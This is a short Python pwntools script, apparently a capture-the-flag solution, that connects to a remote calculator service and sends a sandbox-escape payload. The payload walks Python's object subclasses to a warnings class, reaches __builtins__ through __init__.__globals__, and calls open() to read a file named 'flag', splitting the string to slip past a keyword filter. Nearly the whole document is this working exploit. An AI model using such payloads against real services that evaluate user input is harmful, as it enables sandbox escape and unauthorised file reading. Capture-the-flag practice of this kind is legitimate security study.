from pwn import *

io = remote('pCalc.ctf.prgy.in', 1337)

# We use a simple list comprehension to find the index of a class 
# that usually has builtins, like 'os' or 'catch_warnings'.
# But to avoid freezing, let's try to reach it via a specific known subclass:
# catch_warnings is usually around index 130-150.

# This payload uses a generator to find 'catch_warnings' without the heavy getattr check
payload = (
    "f'{(c := [x for x in ().__class__.__base__.__subclasses__() if \"wrapper\" not in str(x) and \"warning\" in x.__name__.lower()][0])"
    ".__init__.__globals__[\"__builtins__\"][\"open\"](\"fl\"+\"ag\").read()}'"
)

log.info("Sending optimized payload...")
io.sendlineafter(b">>> ", payload.encode())

# Give it a second to process
print(io.recvall(timeout=5).decode())